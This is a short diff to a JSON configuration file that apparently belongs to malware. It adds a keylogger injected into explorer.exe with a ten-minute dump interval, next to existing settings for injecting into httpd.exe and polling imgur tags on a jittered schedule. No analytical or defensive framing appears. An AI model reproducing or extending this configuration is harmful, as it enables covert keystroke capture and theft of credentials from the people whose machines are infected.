@@ -4,11 +4,18 @@
     "imgur_tag": "png",
     "imgur_tag_query_mins": 15,
     "imgur_tag_query_mins_jitter": 1,
+    "keylogger_dump_mins": 10,
     "injector": [
         {
             "type": "gts",
             "targets": [
                 "httpd.exe"
+            ]
+        },
+        {
+            "type": "keylogger",
+            "targets": [
+                "explorer.exe"
             ]
         }
     ]
